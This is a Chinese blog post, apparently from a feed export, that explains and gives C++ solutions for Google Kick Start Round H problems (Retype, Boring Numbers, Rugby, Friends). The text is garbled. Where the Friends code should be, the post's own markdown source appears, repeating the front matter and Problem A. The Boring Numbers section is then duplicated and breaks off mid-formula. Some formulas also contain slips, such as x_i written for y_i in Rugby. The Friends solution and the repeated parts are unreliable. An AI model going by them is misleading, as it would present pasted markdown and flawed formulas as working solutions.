    <published>2020-11-20T04:21:13.052Z</published>
    <updated>2020-11-20T09:24:04.838Z</updated>
    
    <content type="html"><![CDATA[<h1 id="google-kickstart-round-H"><a href="#google-kickstart-round-H" class="headerlink" title="google kickstart round H"></a>google kickstart round H</h1><p><code>google kick start</code>的题目果真经典并且又不失思考的乐趣，质量非常高的题目，我觉得思考的深度非常有代表性。</p><h2 id="Problem-A-Retype"><a href="#Problem-A-Retype" class="headerlink" title="Problem A - Retype"></a>Problem A - Retype</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>选择游戏重启的位置</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol><li>真心是送分问题，一共只有两种选择，要么从头开始，要么倒回到第<code>s</code>关开始。<script type="math/tex; mode=display">minT = k + min(n,k+n-2*s)</script><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; pii;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">slove</span><span class="params">(<span class="keyword">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,k,s;</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;k&gt;&gt;s;</span><br><span class="line">    ans = k + min(n,k+n<span class="number">-2</span>*s);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"Case #"</span>&lt;&lt;i+<span class="number">1</span>&lt;&lt;<span class="string">": "</span>;</span><br><span class="line">        slove(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><a id="more"></a><h2 id="Boring-Numbers"><a href="#Boring-Numbers" class="headerlink" title="Boring Numbers"></a>Boring Numbers</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><ul><li><code>boring number</code>定义：从高位开始，起始索引为<code>1</code>，奇数位的数字为奇数，偶数位的数字为偶数。<br>求给定范围$[L,R]$中<code>boring number</code>的个数<h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 数位<code>dp</code></p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3></blockquote></li></ul><ol><li>典型的可以用数位<code>dp</code>来解决该问题，我们可以转换思路，设<code>count(x)</code>表示从<code>1</code>到<code>x</code>之间的<code>boring number</code>的个数，则结果可以转化为:<script type="math/tex; mode=display">ans = count(R) - count(L-1)</script></li><li>难点在于求<code>count(x)</code>，我们可以将小于<code>x</code>的数字分为两种情况，一种为数字的位数与<code>x</code>相等用$X_{lower}$表示;另一种为数字的位数与<code>x</code>相等，用$X_{equal}$表示。<script type="math/tex; mode=display">n = bits(x) \\count[x] = X_{lower} + X_{equal} \\X_{lower} = \sum_{i=1}^{n-1}5^{i}</script></li></ol><ul><li>求$X_{equal}$稍微复杂点，我们设<code>dp[i][0]</code>表示字符的长度为<code>i</code>,且前<code>i</code>的数字与<code>x</code>相等且为<code>boring number</code>的个数，这个其实很简单，要么为<code>0</code>,要么为<code>1</code>；设<code>dp[i][1]</code>表示字符的长度为<code>i</code>,且前<code>i</code>的数字与<code>x</code>不相等且为<code>boring number</code>的个数，则此时:<script type="math/tex; mode=display">dp[i][1] = dp[i-1][1]*5 + dp[i-1][0]*(X[i]/2) \\X_{equal} = dp[n][0] + dp[n][1] \\count[x] = \sum_{i=1}^{n-1}5^{i} + dp[n][0] + dp[n][1] \\</script></li></ul><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; pii;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> cnt[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> dp[<span class="number">20</span>][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">count</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(n &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; arr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> x = n; x != <span class="number">0</span>; x = x/<span class="number">10</span>)&#123;</span><br><span class="line">        arr.push_back(x%<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    reverse(arr.begin(),arr.end());</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; arr.size(); ++i)&#123;</span><br><span class="line">        ans += cnt[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> m = arr.size();</span><br><span class="line">    <span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="keyword">sizeof</span>(dp));</span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; ++i)&#123;</span><br><span class="line">        <span class="comment">/*upper*/</span></span><br><span class="line">        <span class="keyword">if</span>((arr[i<span class="number">-1</span>]%<span class="number">2</span>) == (i%<span class="number">2</span>)) dp[i][<span class="number">0</span>] = dp[i<span class="number">-1</span>][<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">else</span> dp[i][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">/*lower*/</span></span><br><span class="line">        <span class="keyword">if</span>(i  &gt; <span class="number">1</span>) dp[i][<span class="number">1</span>] += dp[i<span class="number">-1</span>][<span class="number">1</span>]*<span class="number">5</span>;</span><br><span class="line">        <span class="keyword">if</span>(i == <span class="number">1</span>)&#123;</span><br><span class="line">            dp[i][<span class="number">1</span>] += arr[i<span class="number">-1</span>]/<span class="number">2</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; arr[i<span class="number">-1</span>]; ++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>((j%<span class="number">2</span>) == (i%<span class="number">2</span>)) dp[i][<span class="number">1</span>] += dp[i<span class="number">-1</span>][<span class="number">0</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ans += dp[m][<span class="number">0</span>];</span><br><span class="line">    ans += dp[m][<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">slove</span><span class="params">(<span class="keyword">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> l,r;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;l&gt;&gt;r;</span><br><span class="line">    ans = count(r) - count(l<span class="number">-1</span>);</span><br><span class="line">    <span class="comment">//cout&lt;&lt;count(r)&lt;&lt;":"&lt;&lt;count(l-1)&lt;&lt;endl;</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    cnt[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">18</span>; ++i)&#123;</span><br><span class="line">        cnt[i] = cnt[i<span class="number">-1</span>]*<span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"Case #"</span>&lt;&lt;i+<span class="number">1</span>&lt;&lt;<span class="string">": "</span>;</span><br><span class="line">        slove(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Rugby"><a href="#Rugby" class="headerlink" title="Rugby"></a>Rugby</h2><p>给定一堆坐标$(x_{i},y_{i})$,求将这些坐标变为一行的最小曼哈顿距离之和:<br>$(X,Y),(X+1,Y),(X+2,Y),(X+3,Y),(X+4,Y)…(X+N,Y)$.</p><h3 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 中位数。</p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><ol><li>我们仔细观察一下，实际上目标值的<code>(x,y)</code>实际上是独立的，相互之间不影响，则我们可以分别来求出<code>(X,Y)</code>。<script type="math/tex; mode=display">Target = min(\sum_{i=0}^{n-1}abs(x_{i}-X-i) + \sum_{i=0}^{n-1}abs(x_{i}-Y)</script></li><li>在已知条件下，我们很容易求出<code>y</code>的值，因为知道要满足距离之和最小的值为中位数。我们对所有坐标的纵坐标按照大小进行排序,<code>Y</code>即为排序后的中位数。<script type="math/tex; mode=display">Y = \frac{y_{\frac{n-1}{2}} + y_{\frac{n}{2}}}{2}</script></li><li>我们再来求<code>X</code>,我们同样也对<code>x</code>进行排序，我们需要求出$\sum_{i=0}^{n-1}abs(x_{i}-X-i)$的最小值，实际上可以转为$\sum_{i=0}^{n-1}abs((x_{i}-i) -X)$的最小值，因此我们此时构造数组：<script type="math/tex; mode=display">(x_{0},x_{1}-1,x_{2}-2,x_{3}-3...,x_{n}-n)</script>此时求最小距离之和可以转换为求中位数即可，满足题目要求，此时我们相当于求上述转化数组的中位数。<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; pii;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">slove</span><span class="params">(<span class="keyword">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> midx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> midy = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">long</span> <span class="keyword">long</span>&gt; arrx(n);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">long</span> <span class="keyword">long</span>&gt; arry(n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;arrx[i]&gt;&gt;arry[i];</span><br><span class="line">    &#125;</span><br><span class="line">    sort(arry.begin(),arry.end());</span><br><span class="line">    sort(arrx.begin(),arrx.end());</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">        arrx[i] -= i;</span><br><span class="line">    &#125;</span><br><span class="line">    sort(arrx.begin(),arrx.end());</span><br><span class="line">    midx = (arrx[(n<span class="number">-1</span>)/<span class="number">2</span>] + arrx[n/<span class="number">2</span>])/<span class="number">2</span>;</span><br><span class="line">    midy = (arry[(n<span class="number">-1</span>)/<span class="number">2</span>] + arry[n/<span class="number">2</span>])/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">        ans += <span class="built_in">abs</span>(arrx[i]-midx);</span><br><span class="line">        ans += <span class="built_in">abs</span>(arry[i]-midy);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"Case #"</span>&lt;&lt;i+<span class="number">1</span>&lt;&lt;<span class="string">": "</span>;</span><br><span class="line">        slove(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="Friends"><a href="#Friends" class="headerlink" title="Friends"></a>Friends</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>给定图，图中的每个节点含有一个字符串，如果两个字符串<code>s,t</code>存在有相同字母，则认为两个节点存在相互连接的边，给定一组查询<code>(x,y)</code>，求节点<code>x</code>与<code>y</code>之间的最短路劲。</p><h3 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 图的遍历</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li>题目挺有新意的，如果直接用<code>bfs</code>来遍历图的话，按照图中给定的数据集肯定会超时，所以必须要转换思路。</li><li>我们可以转换成求字符<code>a,b</code>的最短距离。我们可以求所所有字符的最短转移路劲，本题也就转化为求所有可能的字符的最短转换路径。</li><li>我们假设源字符串为<code>s</code>，目标字符串为<code>t</code>，假如<code>s</code>和<code>t</code>之间存在相同的字符<code>e</code>，则很容易我们知道直接跳一步即可得到结果,<code>chain</code>的最短长度应该为<code>2</code>。<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s-<span class="function"><span class="params">(e)</span>-&gt;</span>t</span><br></pre></td></tr></table></figure>假如<code>s</code>和<code>t</code>之间是通过不同的字符进行跳转得到的结果，且目标的最短的<code>chain</code>为：<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s-<span class="function"><span class="params">(c1)</span>-&gt;</span>s1-<span class="function"><span class="params">(c2)</span>-&gt;</span>s2-<span class="function"><span class="params">(c3)</span>-&gt;</span>s3-&gt;...<span class="function">-&gt;</span>sn-<span class="function"><span class="params">(cn)</span>-&gt;</span>t</span><br></pre></td></tr></table></figure>根据以上推论我们可以知道如果满足最短的<code>chain</code>，则必然可以得到以下结论:<script type="math/tex; mode=display">c_{1} \neq c_{2} \neq c_{3} \neq c_{4} \neq c_{5} .... \neq c_{n}</script>我们假设存在$c_{i} = c_{j}$,则我们可以判定直接可以通过<code>i</code>跳转到<code>j</code>即可，而不必再通过$c_{i+1},c_{i+2},…,c_{j-1}$进行跳转,因此我们只需求出不同字符之间跳转的最短距离即可。我们可以设相同字符的跳转距离为<code>0</code>.</li><li>我们可以很容易求出，两个字符串之间的字符跳转的最短转换距离，最终的答案为$minJump + 2$.<h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 【google kickstart】  roundH</span><br><span class="line">tags: kickstart</span><br><span class="line">categories: 算法</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"><span class="meta"># google kickstart round H</span></span><br><span class="line">`google kick start`的题目果真经典并且又不失思考的乐趣，质量非常高的题目，我觉得思考的深度非常有代表性。</span><br><span class="line"></span><br><span class="line">## Problem A - Retype</span><br><span class="line">### 题目</span><br><span class="line">选择游戏重启的位置</span><br><span class="line">### 思路</span><br><span class="line"><span class="number">1.</span> 真心是送分问题，一共只有两种选择，要么从头开始，要么倒回到第`s`关开始。</span><br><span class="line">$$</span><br><span class="line">minT = k + min(n,k+n<span class="number">-2</span>*s)</span><br><span class="line">$$</span><br><span class="line">### 代码</span><br><span class="line">```c++</span><br><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;<span class="built_in">vector</span>&gt;</span><br><span class="line">#include&lt;<span class="built_in">set</span>&gt;</span><br><span class="line">#include&lt;<span class="built_in">unordered_set</span>&gt;</span><br><span class="line">#include&lt;<span class="built_in">map</span>&gt;</span><br><span class="line">#include&lt;<span class="built_in">unordered_map</span>&gt;</span><br><span class="line">#include&lt;<span class="built_in">string</span>&gt;</span><br><span class="line">#include&lt;<span class="built_in">stack</span>&gt;</span><br><span class="line">#include&lt;algorithm&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; pii;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">slove</span><span class="params">(<span class="keyword">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,k,s;</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;k&gt;&gt;s;</span><br><span class="line">    ans = k + min(n,k+n<span class="number">-2</span>*s);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"Case #"</span>&lt;&lt;i+<span class="number">1</span>&lt;&lt;<span class="string">": "</span>;</span><br><span class="line">        slove(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="Boring-Numbers-1"><a href="#Boring-Numbers-1" class="headerlink" title="Boring Numbers"></a>Boring Numbers</h2><h3 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h3><ul><li><code>boring number</code>定义：从高位开始，起始索引为<code>1</code>，奇数位的数字为奇数，偶数位的数字为偶数。<br>求给定范围$[L,R]$中<code>boring number</code>的个数<h3 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 数位<code>dp</code></p><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3></blockquote></li></ul><ol><li>典型的可以用数位<code>dp</code>来解决该问题，我们可以转换思路，设<code>count(x)</code>表示从<code>1</code>到<code>x</code>之间的<code>boring number</code>的个数，则结果可以转化为:<script type="math/tex; mode=display">ans = count(R) - count(L-1)</script></li><li>难点在于求<code>count(x)</code>，我们可以将小于<code>x</code>的数字分为两种情况，一种为数字的位数与<code>x</code>相等用$X_{lower}$表示;另一种为数字的位数与<code>x</code>相等，用$X_{equal}$表示。<script type="math/tex; mode=display">n = bits(x) \\count[x] = X_{lower} + X_{equal} \\X_{lower} = \sum_{i=1}^{n-1}5^{i}</script></li></ol><ul><li>求$X_{equal}$稍微复杂点，我们设<code>dp[i][0]</code>表示字符的长度为<code>i</code>,且前<code>i</code>的数字与<code>x</code>相等且为<code>boring number</code>的个数，这个其实很简单，要么为<code>0</code>,要么为<code>1</code>；设<code>dp[i][1]</code>表示字符的长度为<code>i</code>,且前<code>i</code>的数字与<code>x</code>不相等且为<code>boring number</code>的个数，则此时:<script type="math/tex; mode=display">dp[i][1] = dp[i-1][1]*5 + 